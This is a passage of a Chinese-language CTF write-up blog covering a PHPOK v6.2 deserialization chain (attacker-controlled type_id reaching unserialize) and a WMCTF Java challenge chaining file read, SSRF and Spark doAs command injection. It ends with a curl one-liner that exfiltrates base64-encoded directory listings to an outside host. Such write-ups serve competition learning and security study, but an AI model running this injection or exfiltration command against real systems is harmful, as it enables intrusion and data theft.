&amp;&amp; is_string($rs))&#123;</span><br><span class="line">			parse_str($rs,$rs); //parse_str 将字符串解析成多个变量</span><br><span class="line">		&#125;</span><br><span class="line">		...</span><br><span class="line">		// 向$rs中添加了两个字段site和_baseurl</span><br><span class="line">		if(substr($id,0,1) != &#x27;_&#x27;)&#123;</span><br><span class="line">			$call_rs = $this-&gt;load_phpoklist($id,$rs[&#x27;site&#x27;]); // 从$id=m_picplayer中获取信息</span><br><span class="line">			...</span><br><span class="line">			if($rs &amp;&amp; is_array($rs))&#123;</span><br><span class="line">				$call_rs = array_merge($call_rs,$rs); // 后面的值覆盖前面的，关键点，利用$rs中的type_id覆盖掉$call_rs的</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			...</span><br><span class="line">		&#125;</span><br><span class="line">		$func = &#x27;_&#x27;.$call_rs[&#x27;type_id&#x27;];</span><br><span class="line">		if(!in_array($func,$this-&gt;mlist))&#123; // $this-mlist可用_format_ext_all打反序列化和_sql打任意sql注入然后在别处触发反序列化</span><br><span class="line">			return false;</span><br><span class="line">		&#125;</span><br><span class="line">		...</span><br><span class="line">		return $this-&gt;$func($call_rs,$cache_id); 关键点 $func = _format_ext_all -&gt; framework/phpok_call.php $call_rs[&#x27;x&#x27;]是我们控制的反序列化数据</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>framework/phpok_call.php#_format_ext_all($rslist)</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">private function _format_ext_all($rslist)</span><br><span class="line">&#123;</span><br><span class="line">	$res = &#x27;&#x27;;</span><br><span class="line">	foreach($rslist as $key=&gt;$value)&#123; $value为我们设置的x时</span><br><span class="line">		if($value[&#x27;form_type&#x27;] == &#x27;url&#x27; &amp;&amp; $value[&#x27;content&#x27;])&#123;</span><br><span class="line">			$value[&#x27;content&#x27;] = unserialize($value[&#x27;content&#x27;]); //触发反序列化</span><br><span class="line">			...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>到这里，这个洞跟完了，实际上并不复杂，可惜当时没有环境能看看处理流程，不然感觉自己应该可以完成这个0day的审计的！不过一切都在变好，继续努力😄</p>
+<h1 id="WMCTF-JAVA"><a href="#WMCTF-JAVA" class="headerlink" title="WMCTF - JAVA"></a>WMCTF - JAVA</h1><blockquote>
+<p>懒，就写在这里了，精力都给qwb了，只做了一道web</p>
+</blockquote>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>给了个任意文件读取，但是这个任意文件读取可以列目录，比较神奇，读了Java的目录，没有什么有意思的东西，但是在读环境变量的时候翻到了一些k8s的配置，就在想是不是要ssrf打内网。</p>
+<p>读取/proc/self/cwd目录时有很多tomcat的日志，在catalina的日志中翻到了一些遗落信息，比如打了10.244.0.160:8080这种，于是放开手扫这个c段（其实按理说应该是翻到配置，有个10段的内网地址，然后扫b段的，这里取巧了，因为看题的时候已经很迟了），然后扫到了spark</p>
+<p>在ssrf点过滤了反引号，反引号的url编码，反引号url编码的url编码，搜了下这个洞，触发点在doAs参数，这个参数直接合并到<code>/bin/bash -c &quot;id -Gn 参数&quot;</code>中，命令拼接一下就行，于是在vps上监听，用;做一下分割就可以（注意payload需要两次url编码，一次是ssrf二次是内网web服务）,payload如下</p>
+<p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20220822191901305.png" alt="image-20220822191901305"></p>
+<p>这里环境比较坑，我在美丽国的vps收不到，但是国内的vps点击就上，当时折腾了好久，记录下curl外带</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;curl -d &quot;x=$(ls /|base64)&quot; http://8.8.8.8</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/paper/">Paper</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#QWB-FINAL-CMS-PHPOK-v6-2"><span class="toc-number">1.</span> <span class="toc-text">QWB FINAL - CMS (PHPOK v6.2)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">1.2.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Track-It"><span class="toc-number">1.3.</span> <span class="toc-text">Track It</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WMCTF-JAVA"><span class="toc-number">2.</span> <span class="toc-text">WMCTF - JAVA</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">2.1.</span> <span class="toc-text">思路</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&text=NS - QWB 2022"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&title=NS - QWB 2022"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&is_video=false&description=NS - QWB 2022"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NS - QWB 2022&body=Check out this article: http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&title=NS - QWB 2022"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&title=NS - QWB 2022"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&title=NS - QWB 2022"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&title=NS - QWB 2022"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&name=NS - QWB 2022&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&t=NS - QWB 2022"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <!-- <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script> -->
+
+    <div class="footer-center">
+      Copyright &copy;
+      
+      
+      2021-2022
+      Powered by
+      outx
+      <!-- (<span id="busuanzi_value_site_pv"></span>) -->
+    </div>
+  
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/paper/">Paper</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+  <br>
+
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
